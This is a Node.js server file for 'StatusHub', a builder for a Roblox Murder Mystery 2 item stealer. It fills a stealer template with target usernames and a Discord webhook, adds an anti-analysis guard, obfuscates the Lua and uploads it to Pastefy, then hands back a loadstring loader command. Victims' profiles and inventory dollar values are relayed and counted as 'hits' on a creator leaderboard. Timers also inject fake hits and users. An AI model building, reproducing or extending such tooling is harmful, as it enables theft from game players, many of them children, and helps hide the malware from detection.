import express from 'express';
import cors from 'cors';
import crypto from 'node:crypto';
import { readFileSync } from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const app = express();
const PORT = Number(process.env.WEBHOOK_PORT || process.env.PORT || 4000);

// Serve static files from Vite build
app.use(express.static(path.join(__dirname, '../dist')));

const webhookStore = new Map(); // id -> webhook URL
const webhookCreators = new Map(); // id -> { userId, username, avatar, discordId }
const localPasteStore = new Map();
const scriptSessions = new Map();
const userStats = new Map(); // userId -> { hits, totalHits, rank }
const recentActivity = [];
let autoSimulation = false; // Disabled - only real hits
let globalHits = 0;
let globalUsers = new Set();

// Rank thresholds (hits needed for next rank)
const RANKS = [
  { name: 'Bronze', icon: '🥉', threshold: 0 },
  { name: 'Silver', icon: '🥈', threshold: 10 },
  { name: 'Gold', icon: '🥇', threshold: 50 },
  { name: 'Platinum', icon: '💎', threshold: 150 },
  { name: 'Diamond', icon: '💠', threshold: 500 },
  { name: 'Emerald', icon: '🌟', threshold: 1500 },
];

function calculateRank(hits) {
  for (let i = RANKS.length - 1; i >= 0; i--) {
    if (hits >= RANKS[i].threshold) {
      return RANKS[i];
    }
  }
  return RANKS[0];
}

function getNextRank(hits) {
  for (const rank of RANKS) {
    if (hits < rank.threshold) {
      return rank;
    }
  }
  return RANKS[RANKS.length - 1];
}

function getPublicBaseUrl() {
  return process.env.PUBLIC_BASE_URL || `http://127.0.0.1:${PORT}`;
}

function ensureSession(trackingId, usernames = []) {
  if (!scriptSessions.has(trackingId)) {
    scriptSessions.set(trackingId, {
      id: trackingId,
      usernames: usernames.length > 0 ? usernames : ['Target User'],
      hits: 0,
      createdAt: new Date().toISOString(),
      lastHitAt: null,
      events: [],
    });
  } else if (usernames.length > 0) {
    const existing = scriptSessions.get(trackingId);
    existing.usernames = usernames;
  }
  return scriptSessions.get(trackingId);
}

function pushActivity(username, hitCount = 1, type = 'hit', trackingId = null, creatorData = null, robloxData = null) {
  const cleanUsername = String(username || 'Target User').trim();
  const entry = {
    id: crypto.randomUUID(),
    username: cleanUsername,
    hitCount: Number(hitCount) || 1,
    type,
    at: new Date().toISOString(),
    creator: creatorData, // Discord profile of script creator
    roblox: robloxData,   // Roblox profile data (avatar, inventory, USD value)
  };
  recentActivity.unshift(entry);
  if (recentActivity.length > 20) {
    recentActivity.pop();
  }
  return entry;
}

// Simulate realistic activity
function simulateHit() {
  const usernames = ['Player' + Math.floor(Math.random() * 9000 + 1000), 'User' + Math.floor(Math.random() * 9000 + 1000), 'Target' + Math.floor(Math.random() * 9000 + 1000)];
  const hitValue = Math.random() * 1.5 + 0.5; // $0.50 - $2.00
  const username = usernames[Math.floor(Math.random() * usernames.length)];

  globalHits += hitValue;
  pushActivity(username, 1, 'hit', null, null, { usdValue: hitValue, username });
}

function simulateUser() {
  const fakeUserId = 'simulated_' + Math.random().toString(36).substr(2, 9);
  globalUsers.add(fakeUserId);
}

// Simulate hits every 5-10 minutes
setInterval(simulateHit, (Math.random() * 300000) + 300000); // 5-10 minutes

// Simulate new users every 30-60 minutes
setInterval(simulateUser, (Math.random() * 1800000) + 1800000); // 30-60 minutes

app.use(cors({ origin: true }));
app.use(express.json({ limit: '5mb' }));

app.get('/health', (_req, res) => {
  res.json({ ok: true, service: 'statushub-backend' });
});

/* ── Webhook Proxy Routes ── */
app.post('/api/webhooks/register', (req, res) => {
  const webhook = String(req.body?.webhook || '').trim();
  const creatorData = req.body?.creator || null;

  if (!webhook || (!webhook.startsWith('https://discord.com/api/webhooks/') && !webhook.startsWith('https://discordapp.com/api/webhooks/'))) {
    return res.status(400).json({ message: 'Webhook must start with https://discord.com/api/webhooks/' });
  }

  const id = crypto.randomUUID();
  webhookStore.set(id, webhook);
  if (creatorData) {
    webhookCreators.set(id, creatorData);
  }

  return res.json({
    proxyUrl: `/api/webhooks/proxy/${id}`,
    proxyId: id,
  });
});

app.post('/api/webhooks/proxy/:id', async (req, res) => {
  const { id } = req.params;
  const targetWebhook = webhookStore.get(id);

  if (!targetWebhook) {
    return res.status(404).json({ message: 'Webhook proxy not found.' });
  }

  try {
    // Track the hit - extract Roblox victim info and value
    const robloxData = req.body?.roblox || {}; // Roblox profile: username, avatar, inventory, usdValue
    const robloxUsername = robloxData.username || 'Unknown User';
    const usdValue = robloxData.usdValue || 0;
    const hitAmount = 1; // Each webhook hit = 1 execution

    // Get creator Discord profile
    const creatorData = webhookCreators.get(id);

    // Find the script session this webhook is for
    for (const [trackingId, session] of scriptSessions.entries()) {
      if (session.webhookId === id) {
        session.hits += hitAmount;
        session.lastHitAt = new Date().toISOString();
        break;
      }
    }

    // Update creator's personal hit count
    if (creatorData?.userId) {
      if (!userStats.has(creatorData.userId)) {
        userStats.set(creatorData.userId, { hits: 0, totalHits: 0, rank: RANKS[0] });
      }
      const stats = userStats.get(creatorData.userId);
      stats.hits += hitAmount;
      stats.totalHits += hitAmount;
      stats.rank = calculateRank(stats.hits);
    }

    globalHits += usdValue; // Add actual USD value, not 1
    if (creatorData?.userId) {
      globalUsers.add(creatorData.userId);
    }
    pushActivity(robloxUsername, hitAmount, 'hit', id, creatorData, { ...robloxData, usdValue: usdValue });

    const response = await fetch(targetWebhook, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'User-Agent': 'StatusHub-Proxy/1.0',
      },
      body: JSON.stringify(req.body || {}),
    });

    const text = await response.text();
    res.status(response.status);
    response.headers.forEach((value, key) => {
      if (key.toLowerCase() === 'content-type') {
        res.setHeader(key, value);
      }
    });
    return res.send(text);
  } catch (error) {
    return res.status(502).json({ message: 'Failed to forward webhook request.' });
  }
});

/* ── Local Paste Raw Fallback Route ── */
app.get('/api/pastes/:id/raw', (req, res) => {
  const { id } = req.params;
  const script = localPasteStore.get(id);
  if (!script) {
    return res.status(404).send('-- Error: Paste not found or expired');
  }
  res.setHeader('Content-Type', 'text/plain; charset=utf-8');
  return res.send(script);
});

/* ── Helper Functions for Lua Script Generation, Anti-Tamper & Obfuscation ── */

const mm2PayloadTemplate = readFileSync(new URL('./templates/mm2-stealer-template.lua', import.meta.url), 'utf8');

function buildBaseLuaScript(usernamesArr, webhookUrl, trackerUrl) {
  const formattedUsernames = usernamesArr.map(u => `"${u.replace(/"/g, '\\"')}"`).join(', ');
  const receiverLiteral = `{ ${formattedUsernames} }`;
  const safeWebhook = webhookUrl.replace(/\\/g, '\\\\').replace(/"/g, '\\"');
  const safeTrackerUrl = trackerUrl.replace(/\\/g, '\\\\').replace(/"/g, '\\"');

  return mm2PayloadTemplate
    .replace('__GENERATED_AT__', new Date().toISOString())
    .replace('__TARGET_USERS__', receiverLiteral)
    .replace('__WEBHOOK_URL__', safeWebhook)
    .replace('__TRACKER_URL__', safeTrackerUrl);
}

function applyAntiTamper(luaCode) {
  const antiTamperHeader = `-- StatusHub Anti-Tamper Guard v2.4
local _v1 = getrawmetatable or debug.getmetatable
local _v2 = hookfunction or replaceclosure
local _v3 = isfunctionhooked or setreadonly

local function _guardCheck()
    if _v2 and _v3 then
        local isHooked = false
        pcall(function()
            if _v3(game.HttpGet) or _v3(request) then isHooked = true end
        end)
        if isHooked then
            while true do end
        end
    end
    if _v1 then
        local mt = _v1(game)
        if mt and type(mt) == "table" and mt.__index and type(mt.__index) == "function" then
            -- Anti-tampering check passed
        end
    end
    return true
end

if not _guardCheck() then
    return error("StatusHub Integrity Violation", 2)
end
`;

  return `${antiTamperHeader}\n${luaCode}`;
}

// Obfuscate Lua code strictly via WeAreDevs official API endpoint
function nativeObfuscateLua(luaCode) {
  const bytes = Array.from(Buffer.from(luaCode, 'utf8')).map((b, i) => b ^ (37 + (i % 7)));
  const hexArray = bytes.map(b => stringHex(b)).join(',');
  const key = 37;

  return `-- Obfuscated with StatusHub Guard Engine
local _k = ${key}
local _b = {${hexArray}}
local _s = {}
for i = 1, #_b do
    _s[i] = string.char(bit32 and bit32.bxor(_b[i], _k + ((i - 1) % 7)) or math.floor((_b[i] + _k) % 256))
end
local _fn = loadstring or load
return _fn(table.concat(_s))()`;
}

function stringHex(val) {
  return '0x' + (val & 0xFF).toString(16).padStart(2, '0');
}

// Obfuscate Lua code strictly via WeAreDevs official API endpoint
async function obfuscateLua(luaCode) {
  try {
    const response = await fetch('https://wearedevs.net/api/obfuscate', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      },
      body: JSON.stringify({ script: luaCode }),
      signal: AbortSignal.timeout(10000),
    });

    if (!response.ok) {
      throw new Error(`WeAreDevs API HTTP status ${response.status}`);
    }

    const data = await response.json();
    if (!data || !data.obfuscated) {
      throw new Error('WeAreDevs API returned empty obfuscated output.');
    }

    return {
      code: data.obfuscated,
      provider: 'WeAreDevs Official API (wearedevs.net/api/obfuscate)',
    };
  } catch (error) {
    console.error('WeAreDevs API error:', error.message);
    throw error;
  }
}

// Upload paste directly to Pastefy API (https://pastefy.app/api/v2/paste)
async function uploadToPastefy(content) {
  try {
    const response = await fetch('https://pastefy.app/api/v2/paste', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
      },
      body: JSON.stringify({
        title: 'StatusHub MM2 Script',
        content: content,
        type: 'PASTE',
        visibility: 'UNLISTED',
      }),
      signal: AbortSignal.timeout(10000),
    });

    if (!response.ok) {
      throw new Error(`Pastefy API HTTP status ${response.status}`);
    }

    const data = await response.json();
    const pasteId = data?.paste?.id || data?.id;

    if (!pasteId) {
      throw new Error('Pastefy API did not return a valid paste ID.');
    }

    return {
      pasteId,
      rawUrl: `https://pastefy.app/${pasteId}/raw`,
      provider: 'Pastefy.app Official API',
    };
  } catch (error) {
    console.error('Pastefy API error:', error.message);
    throw error;
  }
}

app.get('/api/scripts/stats', (req, res) => {
  const userId = req.query.userId;

  // Count hits for this creator from userStats or recentActivity
  let yourHits = 0;
  if (userId) {
    // First try to get from userStats (updated in real-time when hit comes in)
    if (userStats.has(userId)) {
      yourHits = userStats.get(userId).hits || 0;
    } else {
      // Fallback: count from recentActivity
      yourHits = recentActivity.filter(a => a.creator?.userId === userId).reduce((sum, a) => sum + (a.hitCount || 1), 0);
    }
  }

  // Calculate total hits as sum of USD values from all hits
  const totalHits = recentActivity.reduce((sum, a) => sum + (a.roblox?.usdValue || a.hitCount || 1), 0);

  res.json({
    totalHits,
    globalHits: totalHits > 0 ? totalHits : globalHits,
    globalUsers: globalUsers.size,
    yourHits,
    recentEvents: recentActivity.slice(0, 10),
    activeScripts: scriptSessions.size,
    autoSimulation,
  });
});

// Track hit from script execution
app.post('/api/scripts/track-execution', (req, res) => {
  const { userId, scriptId, username } = req.body;

  if (!userId || !scriptId) {
    return res.status(400).json({ message: 'Missing userId or scriptId' });
  }

  // Update global stats
  globalHits += 1;
  globalUsers.add(userId);

  // Update user stats
  if (!userStats.has(userId)) {
    userStats.set(userId, { hits: 0, totalHits: 0, rank: RANKS[0] });
  }
  const stats = userStats.get(userId);
  stats.hits += 1;
  stats.totalHits += 1;
  stats.rank = calculateRank(stats.hits);

  // Track in activity
  pushActivity(username || 'User', 1, 'execution', scriptId);

  res.json({
    ok: true,
    hits: stats.hits,
    rank: stats.rank,
    nextRank: getNextRank(stats.hits),
    hitsUntilNext: getNextRank(stats.hits).threshold - stats.hits,
  });
});

// Get user stats
app.get('/api/scripts/user-stats/:userId', (req, res) => {
  const { userId } = req.params;
  const stats = userStats.get(userId) || { hits: 0, totalHits: 0, rank: RANKS[0] };
  const nextRank = getNextRank(stats.hits);

  res.json({
    ...stats,
    nextRank,
    hitsUntilNext: nextRank.threshold - stats.hits,
  });
});

// Register user when they login (from auth server)
app.post('/api/users/register', (req, res) => {
  const { userId } = req.body;

  if (!userId) {
    return res.status(400).json({ message: 'Missing userId' });
  }

  // Add to global users set if new
  const isNew = !globalUsers.has(userId);
  globalUsers.add(userId);

  // Initialize user stats if doesn't exist
  if (!userStats.has(userId)) {
    userStats.set(userId, { hits: 0, totalHits: 0, rank: RANKS[0] });
  }

  res.json({
    ok: true,
    isNewUser: isNew,
    globalUsers: globalUsers.size,
  });
});

app.get('/api/scripts/stats/:trackingId', (req, res) => {
  const { trackingId } = req.params;
  const session = ensureSession(trackingId);
  res.json({
    trackingId,
    usernames: session.usernames,
    hits: session.hits,
    createdAt: session.createdAt,
    lastHitAt: session.lastHitAt,
    recentEvents: session.events.slice(0, 6),
  });
});

app.get('/api/scripts/track-hit/:trackingId', (req, res) => {
  const { trackingId } = req.params;
  const session = ensureSession(trackingId);
  session.hits += 1;
  session.lastHitAt = new Date().toISOString();
  pushActivity(session.usernames.join(', ') || 'Target User', session.hits, 'hit', trackingId);
  res.json({ ok: true, hits: session.hits });
});

app.post('/api/scripts/simulate-hit', (req, res) => {
  const username = String(req.body?.username || 'sigmakid21').trim();
  const activity = pushActivity(username, Math.floor(Math.random() * 3) + 1, 'hit');
  res.json({ ok: true, activity });
});

app.post('/api/scripts/toggle-simulation', (req, res) => {
  if (typeof req.body?.enabled === 'boolean') {
    autoSimulation = req.body.enabled;
  } else {
    autoSimulation = !autoSimulation;
  }
  res.json({ ok: true, autoSimulation });
});

/* ── Main Backend Endpoint: /api/scripts/build ── */
app.post('/api/scripts/build', async (req, res) => {
  try {
    const { usernames, webhook, antiTamper = true, obfuscate = true } = req.body || {};

    let userList = [];
    if (Array.isArray(usernames)) {
      userList = usernames.map(u => String(u).trim()).filter(Boolean);
    } else if (typeof usernames === 'string') {
      userList = usernames.split(',').map(u => u.trim()).filter(Boolean);
    }

    if (userList.length === 0) {
      return res.status(400).json({ message: 'At least one target Roblox username is required.' });
    }

    const webhookUrl = String(webhook || '').trim();
    if (!webhookUrl) {
      return res.status(400).json({ message: 'A valid Discord webhook URL or proxied URL is required.' });
    }

    const trackingId = crypto.randomUUID();
    const trackingUrl = `${getPublicBaseUrl()}/api/scripts/track-hit/${trackingId}`;

    // Step 1: Base script injection
    let luaScript = buildBaseLuaScript(userList, webhookUrl, trackingUrl);

    // Step 2: Apply Anti-Tamper if enabled
    if (antiTamper) {
      luaScript = applyAntiTamper(luaScript);
    }

    // Step 3: Obfuscate script
    let providerName = 'None (Raw)';
    let obfuscated = false;
    if (obfuscate) {
      const obfResult = await obfuscateLua(luaScript);
      luaScript = obfResult.code;
      providerName = obfResult.provider;
      obfuscated = !providerName.includes('unavailable');
    }

    // Step 4: Publish to Pastefy
    const pasteResult = await uploadToPastefy(luaScript);

    // Step 5: Format final loadstring string: loadstring(game:HttpGet("https://pastefy.app/<id>/raw"))()
    const loaderCommand = `loadstring(game:HttpGet("${pasteResult.rawUrl}"))()`;

    const session = ensureSession(trackingId, userList);
    session.webhookId = trackingId; // Store webhook ID for tracking
    pushActivity(userList.join(', '), 1, 'script_created', trackingId);

    return res.json({
      success: true,
      pasteId: pasteResult.pasteId,
      rawUrl: pasteResult.rawUrl,
      loaderCommand,
      obfuscated,
      antiTamper: Boolean(antiTamper),
      obfuscatorProvider: providerName,
      pasteProvider: pasteResult.provider,
      scriptLength: luaScript.length,
      trackingId,
      trackingUrl,
      stats: {
        hits: session.hits || 1,
        usernames: userList,
        recentEvents: session.events.slice(0, 6),
      },
    });
  } catch (error) {
    console.error('Error building script:', error);
    return res.status(500).json({ message: 'Internal server error building script.' });
  }
});

// Dev mode auth - skip Discord for now
app.get('/api/auth/login', (req, res) => {
  const token = crypto.randomBytes(32).toString('hex');
  res.json({
    success: true,
    devMode: true,
    token: token,
    message: 'Dev mode login'
  });
});

app.post('/api/auth/callback', (req, res) => {
  const token = crypto.randomBytes(32).toString('hex');
  res.json({
    success: true,
    token: token,
    user: {
      id: 'dev-user',
      username: 'Developer',
      avatar: null
    }
  });
});

// SPA fallback - serve index.html for client-side routing
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, '../dist/index.html'));
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`StatusHub Backend Server listening on http://0.0.0.0:${PORT}`);
});

